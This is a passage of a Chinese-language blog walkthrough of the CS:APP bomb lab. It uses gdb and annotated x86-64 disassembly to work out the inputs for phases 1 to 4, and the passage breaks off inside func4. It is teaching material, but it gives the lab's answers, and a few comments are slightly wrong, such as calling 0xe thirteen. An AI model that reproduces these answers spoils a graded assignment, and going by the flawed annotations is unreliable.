；</p><p>不输入参数时，argc为1，此时需要通过标准输入stdin读取phase；</p><p>输入.txt文件作为参数时，argc为2，从txt文件phase；argc最大为2，main只允许输入一个参数。</p><p>从main中可以看到要破解6个phase函数。</p><h4 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h4><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs as">gdb bomb  #进入调试<br>layout asm #显示assembly代码<br>layout reg #显示寄存器值<br>b main #打断点<br>b phase1 <br>i b #显示断点<br><span class="hljs-keyword">delete</span> #删除所有断点<br><span class="hljs-keyword">delete</span> <span class="hljs-number">1</span>#删除标号为<span class="hljs-number">1</span>的断点<br>r #不输入command line参数 直接执行<br>c #执行到下一断点<br>si #单步执行汇编<br></code></pre></td></tr></table></figure><p><code> ctrl +L #刷新gdb</code> </p><p><code>r &lt;ans.txt   #输入txt文件 开始执行代码</code></p><p>进入phase_1之前，会通过read_line函数读取phase，随便输入一个phase,如123，然后去看phase_1的汇编代码如何执行的。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400ee0</span> &lt;phase_1&gt;:<br>  <span class="hljs-attribute">400ee0</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          sub    $<span class="hljs-number">0</span>x8,%rsp<br>  <span class="hljs-attribute">400ee4</span>:be <span class="hljs-number">00</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x402400,%esi<br>  <span class="hljs-attribute">400ee9</span>:e8 <span class="hljs-number">4</span>a <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">401338</span> &lt;strings_not_equal&gt;<br>  <span class="hljs-attribute">400eee</span>:<span class="hljs-number">85</span> c0                test   %eax,%eax<br>  <span class="hljs-attribute">400ef0</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>ef7 &lt;phase_1+<span class="hljs-number">0</span>x17&gt;                     #strings_not_equal返回<span class="hljs-number">0</span>则跳转，不爆炸<br>  <span class="hljs-attribute">400ef2</span>:e8 <span class="hljs-number">43</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400ef7</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">08</span>          add    $<span class="hljs-number">0</span>x8,%rsp<br>  <span class="hljs-attribute">400efb</span>:c3                   retq   <br></code></pre></td></tr></table></figure><p><code>x/s  $rdi #rdi存放phase_1参数，x/s以string形式查看rdi</code></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dns">(gdb) x/s $rdi <br><span class="hljs-number">0x603780</span> &lt;input_strings&gt;:       &quot;<span class="hljs-number">123</span>&quot;         #可以看到是我们输入的<span class="hljs-number">123</span>，而rdi的值为<span class="hljs-number">0x603780</span><br>(gdb) x/<span class="hljs-number">4d</span>x <span class="hljs-number">0x603780</span>                        #查看<span class="hljs-number">0x603780</span>处的<span class="hljs-number">4</span>个bytes  正好是<span class="hljs-number">123</span>的ascii码和结束符<span class="hljs-number">00</span><br><span class="hljs-number">0x603780</span> &lt;input_strings&gt;:       <span class="hljs-number">0</span>x31    <span class="hljs-number">0</span>x32    <span class="hljs-number">0</span>x33    <span class="hljs-number">0</span>x00            <br><br>(gdb) x/dx <span class="hljs-number">0x603780</span>                   #字符串的第一个字符在最低的地址<br><span class="hljs-number">0x603780</span> &lt;input_strings&gt;:       <span class="hljs-number">0</span>x31<br><span class="hljs-number">0x603781</span> &lt;input_strings+<span class="hljs-number">1</span>&gt;:     <span class="hljs-number">0</span>x32<br><span class="hljs-number">0x603782</span> &lt;input_strings+<span class="hljs-number">2</span>&gt;:     <span class="hljs-number">0</span>x33<br><span class="hljs-number">0x603783</span> &lt;input_strings+<span class="hljs-number">3</span>&gt;:     <span class="hljs-number">0</span>x00<br></code></pre></td></tr></table></figure><p>继续执行 可以看到phase_1调用了strings_not_equal()，在该函数打个断点，进入后查看其两个参数（分别在rdi和rsi)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">(gdb) <span class="hljs-selector-tag">b</span> strings_not_equal<br>Breakpoint <span class="hljs-number">3</span> at <span class="hljs-number">0</span>x401338<br>(gdb) c<br>Continuing.<br><br>Breakpoint <span class="hljs-number">3</span>, <span class="hljs-number">0</span>x0000000000401338 <span class="hljs-keyword">in</span> strings_not_equal ()<br>(gdb) <span class="hljs-attribute">x</span>/gx <span class="hljs-variable">$rdi</span><br><span class="hljs-number">0</span>x603780 &lt;input_strings&gt;:       <span class="hljs-string">&quot;123&quot;</span><br>(gdb) <span class="hljs-attribute">x</span>/s <span class="hljs-variable">$rsi</span><br><span class="hljs-number">0</span>x402400:       <span class="hljs-string">&quot;Border relations with Canada have never been better.&quot;</span><br></code></pre></td></tr></table></figure><p>发现phase将0x402400传给了rsi，作为strings_not_equal()的第二个参数</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x400ee4</span> &lt;phase_1+<span class="hljs-number">4</span>&gt;    mov    $<span class="hljs-number">0</span>x402400,%esi   <br></code></pre></td></tr></table></figure><p>因此，可以猜测strings_not_equal()比较其两个字符串参数是否相同，不同则返回1，相同则返回0；</p><p>猜测”Border relations with Canada have never been better.”就是我们需要的第一个phase。</p><p>研究一下strings_not_equal()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401338 &lt;strings_not_equal&gt;:                         #注释的-&gt;&gt;    -&lt;&lt;是跳转标号<br>  401338:41 54                push   %r12<br>  40133a:55                   push   %rbp<br>  40133b:53                   push   %rbx<br>  40133c:48 89 fb             mov    %rdi,%rbx        #存放rdi<br>  40133f:48 89 f5             mov    %rsi,%rbp          #存放rsi<br>  401342:e8 d4 ff ff ff       callq  40131b &lt;string_length&gt;              #计算rdi的str长度 放入r12d<br>  401347:41 89 c4             mov    %eax,%r12d   <br>  40134a:48 89 ef             mov    %rbp,%rdi<br>  40134d:e8 c9 ff ff ff       callq  40131b &lt;string_length&gt;       #计算rsi的str长度 放入rax<br>  401352:ba 01 00 00 00       mov    $0x1,%edx<br>  401357:41 39 c4             cmp    %eax,%r12d                 <br>  40135a:75 3f                jne    40139b &lt;strings_not_equal+0x63&gt;   #长度不等，则返回1  (0x1-&gt;edx-&gt;eax)   -&gt;&gt;&gt;4<br>  40135c:0f b6 03             movzbl (%rbx),%eax      #rbx存的rdi 取第一个字符放入eax<br>  40135f:84 c0                test   %al,%al<br>  401361:74 25                je     401388 &lt;strings_not_equal+0x50&gt;     #字符为00，则跳转，并最终返回0   -&gt;&gt;&gt;1<br>  401363:3a 45 00             cmp    0x0(%rbp),%al         #字符不为0 则与rbp的rsi的第一个字符比较<br>  401366:74 0a                je     401372 &lt;strings_not_equal+0x3a&gt;   #相等则继续比较                 -&gt;&gt;&gt;2  <br>  401368:eb 25                jmp    40138f &lt;strings_not_equal+0x57&gt;  #不等则跳转 返回1                -&gt;&gt;&gt;5<br>  40136a:3a 45 00             cmp    0x0(%rbp),%al              #比较下一字符                          -&lt;&lt;&lt;3<br>  40136d:0f 1f 00             nopl   (%rax)<br>  401370:75 24                jne    401396 &lt;strings_not_equal+0x5e&gt;                            #若不等-&gt;&gt;&gt;6<br>  401372:48 83 c3 01          add    $0x1,%rbx                  #地址偏移                             -&lt;&lt;&lt;2<br>  401376:48 83 c5 01          add    $0x1,%rbp<br>  40137a:0f b6 03             movzbl (%rbx),%eax<br>  40137d:84 c0                test   %al,%al <br>  40137f:75 e9                jne    40136a &lt;strings_not_equal+0x32&gt;      #下一字符ascii不为00，则继续   -&gt;&gt;&gt;3     <br>  401381:ba 00 00 00 00       mov    $0x0,%edx<br>  401386:eb 13                jmp    40139b &lt;strings_not_equal+0x63&gt;                                #-&gt;&gt;&gt;4                <br>  401388:ba 00 00 00 00       mov    $0x0,%edx                                                      #-&lt;&lt;&lt;1<br>  40138d:eb 0c                jmp    40139b &lt;strings_not_equal+0x63&gt;                                #-&gt;&gt;&gt;4   <br>  40138f:ba 01 00 00 00       mov    $0x1,%edx                                                      #-&lt;&lt;&lt;5<br>  401394:eb 05                jmp    40139b &lt;strings_not_equal+0x63&gt;                                #-&gt;&gt;&gt;4<br>  401396:ba 01 00 00 00       mov    $0x1,%edx                                                      #-&lt;&lt;&lt;6<br>  40139b:89 d0                mov    %edx,%eax                                                   #-&lt;&lt;&lt;4<br>  40139d:5b                   pop    %rbx<br>  40139e:5d                   pop    %rbp<br>  40139f:41 5c                pop    %r12<br>  4013a1:c3                   retq <br></code></pre></td></tr></table></figure><h2 id="phase-2-栈存数组"><a href="#phase-2-栈存数组" class="headerlink" title="phase 2 栈存数组"></a>phase 2 栈存数组</h2><h4 id="phase2前半"><a href="#phase2前半" class="headerlink" title="phase2前半"></a>phase2前半</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000400efc &lt;phase_2&gt;:<br>  400efc:55                   push   %rbp<br>  400efd:53                   push   %rbx<br>  400efe:48 83 ec 28          sub    $0x28,%rsp<br>  400f02:48 89 e6             mov    %rsp,%rsi<br>  400f05:e8 52 05 00 00       callq  40145c &lt;read_six_numbers&gt;  <br></code></pre></td></tr></table></figure><p>随便输入123</p><h4 id="read-six-numbers"><a href="#read-six-numbers" class="headerlink" title="read_six_numbers"></a>read_six_numbers</h4><p>phase_2()调用了read_six_numbers()，并开辟了长为0x28&#x3D;40bytes的栈区，栈顶作为参数2(rsi)。</p><p>进入到read_six_numbers()，可以看到scanf之前rsi中的地址值处理之后赋给了一系列寄存器。</p><p><img src="/project/./image/2,bomb_lab_image/image-20240507140029789.png" alt="image-20240507140029789"></p><p>其中0x7fffffffdb20(rsi+0x10)放入了栈区0x7fffffffdaf0（rsp)</p><p>0x7fffffffdb24(rsi+0x14)放入了栈区0x7fffffffdaf8（rsp+8)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">000000000040145c &lt;read_six_numbers&gt;:          #rdi-&gt;&quot;123&quot;   rsi &quot;0x7fffffffdb10&quot;<br>  40145c:48 83 ec 18          sub    $0x18,%rsp<br>  401460:48 89 f2             mov    %rsi,%rdx<br>  401463:48 8d 4e 04          lea    0x4(%rsi),%rcx<br>  401467:48 8d 46 14          lea    0x14(%rsi),%rax<br>  40146b:48 89 44 24 08       mov    %rax,0x8(%rsp)<br>  401470:48 8d 46 10          lea    0x10(%rsi),%rax<br>  401474:48 89 04 24          mov    %rax,(%rsp)<br>  401478:4c 8d 4e 0c          lea    0xc(%rsi),%r9<br>  40147c:4c 8d 46 08          lea    0x8(%rsi),%r8<br>  401480:be c3 25 40 00       mov    $0x4025c3,%esi<br>  401485:b8 00 00 00 00       mov    $0x0,%eax    #rdi（输入的字符串） rsi（格式） rdx rcx r8 r9  rsp存两个<br>  40148a:e8 61 f7 ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;<br>  40148f:83 f8 05             cmp    $0x5,%eax<br>  401492:7f 05                jg     401499 &lt;read_six_numbers+0x3d&gt;<br>  401494:e8 a1 ff ff ff       callq  40143a &lt;explode_bomb&gt;<br>  401499:48 83 c4 18          add    $0x18,%rsp<br>  40149d:c3                   retq   <br></code></pre></td></tr></table></figure><p>查看&lt;__isoc99_sscanf@plt&gt;的参数rdi rsi </p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">(gdb) <span class="hljs-keyword">x</span>/s <span class="hljs-variable">$rdi</span><br><span class="hljs-number">0x6037d0</span> &lt;input_strings+<span class="hljs-number">80</span>&gt;:    <span class="hljs-string">&quot;123&quot;</span><br>(gdb) <span class="hljs-keyword">x</span>/s <span class="hljs-variable">$rsi</span><br><span class="hljs-number">0x4025c3</span>:       <span class="hljs-string">&quot;<span class="hljs-variable">%d</span> <span class="hljs-variable">%d</span> <span class="hljs-variable">%d</span> <span class="hljs-variable">%d</span> <span class="hljs-variable">%d</span> <span class="hljs-variable">%d</span>&quot;</span><br></code></pre></td></tr></table></figure><p>可见phase是6个数，以空格隔开，6个数的存储位置为phase2开辟的栈区（scanf(“%d %d %d %d %d %d”,&amp;para1,&amp;para2….&amp;para6))</p><p>重新运行<code>r</code>,尝试输入1 2 3 4 5 6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">(gdb) b *0x40149d<br>Breakpoint 6 at 0x40149d<br>(gdb) x/wd 0x7fffffffdb10            #以decimal查看该地址，正好是输入的1 2 3 4 5 6<br>0x7fffffffdb10: 1<br>0x7fffffffdb14: 2<br>0x7fffffffdb18: 3<br>0x7fffffffdb1c: 4<br>0x7fffffffdb20: 5<br>0x7fffffffdb24: 6<br></code></pre></td></tr></table></figure><h4 id="继续phase-2"><a href="#继续phase-2" class="headerlink" title="继续phase_2"></a>继续phase_2</h4><p>结束read_six_numbers后rsp指向0x7fffffffdb10，即数字1的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#phase_2后半<br>  400f05:e8 52 05 00 00       callq  40145c &lt;read_six_numbers&gt;<br>  400f0a:83 3c 24 01          cmpl   $0x1,(%rsp)                     #第一个数与1比较 ，不等则爆炸<br>  400f0e:74 20                je     400f30 &lt;phase_2+0x34&gt;           #相等则跳转               -&gt;&gt;1     表示跳到1<br>  400f10:e8 25 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f15:eb 19                jmp    400f30 &lt;phase_2+0x34&gt;<br>  400f17:8b 43 fc             mov    -0x4(%rbx),%eax                 #eax存放rbx之前的一个数，记为pre     #-&lt;&lt;2<br>  400f1a:01 c0                add    %eax,%eax#pre*=2<br>  400f1c:39 03                cmp    %eax,(%rbx)#判断pre==cur            <br>  400f1e:74 05                je     400f25 &lt;phase_2+0x29&gt;                                  # -&gt;&gt;3 <br>  400f20:e8 15 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f25:48 83 c3 04          add    $0x4,%rbx                               #继续偏移          -&lt;&lt;3<br>  400f29:48 39 eb             cmp    %rbp,%rbx                               #看偏移后是否为rbp，rbp指向为空，若为rbp则终止<br>  400f2c:75 e9                jne    400f17 &lt;phase_2+0x1b&gt;                                       #-&gt;&gt;2<br>  400f2e:eb 0c                jmp    400f3c &lt;phase_2+0x40&gt;                                       #终止-&gt;&gt;end<br>  400f30:48 8d 5c 24 04       lea    0x4(%rsp),%rbx                       #偏移rsp得到下一个数      -&lt;&lt;1<br>  400f35:48 8d 6c 24 18       lea    0x18(%rsp),%rbp#rsp偏移0x18后就没有数了<br>  400f3a:eb db                jmp    400f17 &lt;phase_2+0x1b&gt;                                     #   -&gt;&gt;2<br>  400f3c:48 83 c4 28          add    $0x28,%rsp                                                    #-&lt;&lt;end<br>  400f40:5b                   pop    %rbx<br>  400f41:5d                   pop    %rbp<br>  400f42:c3                   retq  <br></code></pre></td></tr></table></figure><p>阅读可知 其作用是判断当前数字是否为前一个数字的2倍，若不是，则错误</p><p>故phase为1 2 4 8 16 32</p><h2 id="phase-3-跳转"><a href="#phase-3-跳转" class="headerlink" title="phase 3 跳转"></a>phase 3 跳转</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000400f43 &lt;phase_3&gt;:<br>  400f43:48 83 ec 18          sub    $0x18,%rsp<br>  400f47:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx                         #num2<br>  400f4c:48 8d 54 24 08       lea    0x8(%rsp),%rdx                         #num1<br>  400f51:be cf 25 40 00       mov    $0x4025cf,%esi<br>  400f56:b8 00 00 00 00       mov    $0x0,%eax                           #scanf(&quot;%d,%d&quot;,&amp;num1,&amp;num2)<br>  400f5b:e8 90 fc ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;       #这里break 查看rsi 其指明了phase格式<br>  400f60:83 f8 01             cmp    $0x1,%eax                   #输入大于等于2个数时，rax为1，输入一个数时rax为1<br>  400f63:7f 05                jg     400f6a &lt;phase_3+0x27&gt;                         # -&gt;&gt;1          <br>  400f65:e8 d0 04 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f6a:83 7c 24 08 07       cmpl   $0x7,0x8(%rsp)                                # -&lt;&lt;1<br>  400f6f:77 3c                ja     400fad &lt;phase_3+0x6a&gt;              #num1 &gt; 7 则爆炸           -&gt;&gt;2<br>  400f71:8b 44 24 08          mov    0x8(%rsp),%eax                     #num1-&gt;rax<br>  400f75:ff 24 c5 70 24 40 00 jmpq   *0x402470(,%rax,8)#以num1做偏移然后跳转，可见0x402470地址的值很重要<br>  400f7c:b8 cf 00 00 00       mov    $0xcf,%eax                      #   rax存放0xcf= 207           -&lt;&lt; num1==0 跳转位置<br>  400f81:eb 3b                jmp    400fbe &lt;phase_3+0x7b&gt;                                         #-&gt;&gt; all<br>  400f83:b8 c3 02 00 00       mov    $0x2c3,%eax                     #  rax=0x2c3=707               -&lt;&lt;num2==2<br>  400f88:eb 34                jmp    400fbe &lt;phase_3+0x7b&gt;                                         #-&gt;&gt;all   <br>  400f8a:b8 00 01 00 00       mov    $0x100,%eax                     #  rax=0x100                   -&lt;&lt;num2==3<br>  400f8f:eb 2d                jmp    400fbe &lt;phase_3+0x7b&gt;                                         #-&gt;&gt;all<br>  400f91:b8 85 01 00 00       mov    $0x185,%eax<br>  400f96:eb 26                jmp    400fbe &lt;phase_3+0x7b&gt;<br>  400f98:b8 ce 00 00 00       mov    $0xce,%eax<br>  400f9d:eb 1f                jmp    400fbe &lt;phase_3+0x7b&gt;<br>  400f9f:b8 aa 02 00 00       mov    $0x2aa,%eax<br>  400fa4:eb 18                jmp    400fbe &lt;phase_3+0x7b&gt;<br>  400fa6:b8 47 01 00 00       mov    $0x147,%eax                                      <br>  400fab:eb 11                jmp    400fbe &lt;phase_3+0x7b&gt;              <br>  400fad:e8 88 04 00 00       callq  40143a &lt;explode_bomb&gt;                                      #-&lt;&lt;2<br>  400fb2:b8 00 00 00 00       mov    $0x0,%eax<br>  400fb7:eb 05                jmp    400fbe &lt;phase_3+0x7b&gt;<br>  400fb9:b8 37 01 00 00       mov    $0x137,%eax                                # rax=0x137=311      -&lt;&lt; num==1 跳转位置<br>  400fbe:3b 44 24 0c          cmp    0xc(%rsp),%eax                       #num2==rax ?            -&lt;&lt; all<br>  400fc2:74 05                je     400fc9 &lt;phase_3+0x86&gt;                               # -&gt;&gt;end<br>  400fc4:e8 71 04 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400fc9:48 83 c4 18          add    $0x18,%rsp                                         #  -&lt;&lt;end<br>  400fcd:c3                   retq  <br></code></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) b *<span class="hljs-number">0x400f5b</span><br>Breakpoint <span class="hljs-number">8</span> <span class="hljs-meta">at</span> <span class="hljs-number">0x400f5b</span><br>(gdb) x/s $<span class="hljs-built_in">rdi</span><br><span class="hljs-number">0x603820</span> &lt;input_strings+<span class="hljs-number">160</span>&gt;:   <span class="hljs-string">&quot;1 10&quot;</span>   #随便输入的<span class="hljs-number">1</span> <span class="hljs-number">10</span><br>(gdb) x/s $<span class="hljs-built_in">rsi</span><br><span class="hljs-number">0x4025cf</span>:       <span class="hljs-string">&quot;%d %d&quot;</span><br></code></pre></td></tr></table></figure><p>查看rsi知道要输入两个数</p><p>查看0x402470，其保存了跳转方向</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">(gdb) x/8gx <span class="hljs-number">0x402470</span><br><span class="hljs-number">0x402470</span>:       <span class="hljs-number">0x0000000000400f7c</span>      <span class="hljs-number">0x0000000000400fb9</span><br><span class="hljs-number">0x402480</span>:       <span class="hljs-number">0x0000000000400f83</span>      <span class="hljs-number">0x0000000000400f8a</span><br><span class="hljs-number">0x402490</span>:       <span class="hljs-number">0x0000000000400f91</span>      <span class="hljs-number">0x0000000000400f98</span><br><span class="hljs-number">0x4024a0</span>:       <span class="hljs-number">0x0000000000400f9f</span>      <span class="hljs-number">0x0000000000400fa6</span><br></code></pre></td></tr></table></figure><p>如phase_2注释所示，num1是跳转地址相对0x402470的偏移量，跳转后，对rax赋值，然后判断num2和rax的值是否相等。</p><p>因此，有8组答案</p><p>0 207</p><p>1 311   …</p><h2 id="phase-4-递归"><a href="#phase-4-递归" class="headerlink" title="phase 4 递归"></a>phase 4 递归</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs assembly">000000000040100c &lt;phase_4&gt;:<br>  40100c:48 83 ec 18          sub    $0x18,%rsp<br>  401010:48 8d 4c 24 0c       lea    0xc(%rsp),%rcx  #num2地址<br>  401015:48 8d 54 24 08       lea    0x8(%rsp),%rdx  #num1地址<br>  40101a:be cf 25 40 00       mov    $0x4025cf,%esi<br>  40101f:b8 00 00 00 00       mov    $0x0,%eax<br>  401024:e8 c7 fb ff ff       callq  400bf0 &lt;__isoc99_sscanf@plt&gt;  #scanf(rdi,rsi,rdx,rcx)<br>  401029:83 f8 02             cmp    $0x2,%eax<br>  40102c:75 07                jne    401035 &lt;phase_4+0x29&gt;<br>  40102e:83 7c 24 08 0e       cmpl   $0xe,0x8(%rsp)        #num1要小于0xe=13<br>  401033:76 05                jbe    40103a &lt;phase_4+0x2e&gt;<br>  401035:e8 00 04 00 00       callq  40143a &lt;explode_bomb&gt;<br>  40103a:ba 0e 00 00 00       mov    $0xe,%edx     <br>  40103f:be 00 00 00 00       mov    $0x0,%esi<br>  401044:8b 7c 24 08          mov    0x8(%rsp),%edi<br>  401048:e8 81 ff ff ff       callq  400fce &lt;func4&gt;         #func4(edi,esi,edx)     3个参数<br>  40104d:85 c0                test   %eax,%eax<br>  40104f:75 07                jne    401058 &lt;phase_4+0x4c&gt;<br>  401051:83 7c 24 0c 00       cmpl   $0x0,0xc(%rsp)           #num2要等于0 才跳转 <br>  401056:74 05                je     40105d &lt;phase_4+0x51&gt;<br>  401058:e8 dd 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  40105d:48 83 c4 18          add    $0x18,%rsp<br>  401061:c3                   retq   <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>*401024```查看```__isoc99_sscanf@plt```参数个数(esi指示了要输入的数的格式)</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs b"><br></code></pre></td></tr></table></figure><p>(gdb) x&#x2F;s $rdi<br>0x603870 &lt;input_strings+240&gt;:   “1 2”<br>(gdb) x&#x2F;s $rsi<br>0x4025cf:       “%d %d”</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><br>于是知道该题要输入两个数，若不是两个则explode_bomb；随便输入 <span class="hljs-number">1</span> <span class="hljs-number">2</span>。<br><br>之后调用了func4  要求func4返回<span class="hljs-number">0</span>。<br><br>根据<span class="hljs-string">```</span> <span class="hljs-number">401051</span>:<span class="hljs-number">83</span> 7c <span class="hljs-number">24</span> 0c <span class="hljs-number">00</span>       cmpl   <span class="hljs-number">$0</span>x0,<span class="hljs-number">0xc</span>(%rsp)<span class="hljs-string">```</span> ，num2显然要为<span class="hljs-number">0</span> 根据<br><br>func4(num1,<span class="hljs-number">0</span>,<span class="hljs-number">13</span>)   代码如下： 研究一下num1即可<br><br><span class="hljs-string">```</span>assembly<br>0000000000400fce &lt;func4&gt;:      #<span class="hljs-number">3</span>个参数  <span class="hljs-built_in">edi</span>=num1 <span class="hljs-built_in">esi</span>=<span class="hljs-number">0</span> <span class="hljs-built_in">edx</span>=<span class="hljs-number">13</span><br>  400fce:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">08</span>          <span class="hljs-keyword">sub</span>    <span class="hljs-number">$0</span>x8,%rsp<br>  400fd2:<span 